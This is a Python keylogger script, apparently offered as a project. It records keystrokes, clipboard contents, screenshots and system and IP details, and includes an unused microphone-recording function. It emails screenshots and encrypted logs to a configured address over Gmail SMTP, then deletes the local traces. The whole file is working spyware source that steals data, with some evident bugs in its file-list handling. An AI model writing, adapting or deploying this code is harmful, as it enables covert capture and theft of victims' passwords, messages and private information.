# Importing Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

from requests import get

from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
key_file = open("..\\Cryptography\\encryption_key.txt")
enc_key = key_file.read()
key_file.close()

file_path = "..\\Keylogger\\Project"
extend = "\\"
file_merge = file_path + extend

email = "Your_Email"
password = "Your_Password"

toaddress = "To_Email"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

# char_limit = 50

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration


def computer_information():
    with open(file_path + extend + system_information, 'a') as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except:
            f.write("Could not get Public IP Address (most likely max requests made)" + "\n")

        f.write("Processor: " + (platform.processor()) + "\n")
        f.write("System Information: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine Information: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


def copy_clipboard():
    with open(file_path + extend + clipboard_information, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: " + pasted_data + "\n")
        except:
            f.write("Clipboard cannot be copied" + "\n")


def send_email(filename, attachment, to_addr):
    from_address = email
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_addr
    msg['Subject'] = "Log File"
    body = "Body_of_the_email"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', 'attachment: filename= %s' % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_address, password)
    text = msg.as_string()
    s.sendmail(from_address, to_addr, text)
    s.quit()


def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)


while number_of_iterations < number_of_iterations_end:
    full_log = ""
    word = ""


    def on_press(key):
        global word, full_log, currentTime
        currentTime = time.time()

        if key == Key.space or key == Key.enter:
            word += " "
            full_log += word
            word = ""
            write_file(full_log)
            full_log = ""
        elif key == Key.shift_l or key == Key.shift_r:
            return
        elif key == Key.backspace:
            word = word[:-1]
        else:
            char = f"{key}"
            char = char = char[1:-1]
            word += char
        if key == Key.esc:
            return False


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                f.write(key)


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddress)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

files_to_encrypt = [file_merge + system_information, file_merge + keys_information + file_merge + clipboard_information]
encrypted_files = [file_merge + system_information_e,
                   file_merge + keys_information_e + file_merge + clipboard_information_e]

for file, enc in zip(files_to_encrypt, encrypted_files):
    with open(file, 'rb') as f:
        data = f.read()

    fernet = Fernet = Fernet(enc_key)
    encrypted = fernet.encrypt(data)

    with open(enc, 'wb') as f:
        f.write(encrypted)

    send_email(enc, enc, toaddress)

time.sleep(120)

delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)
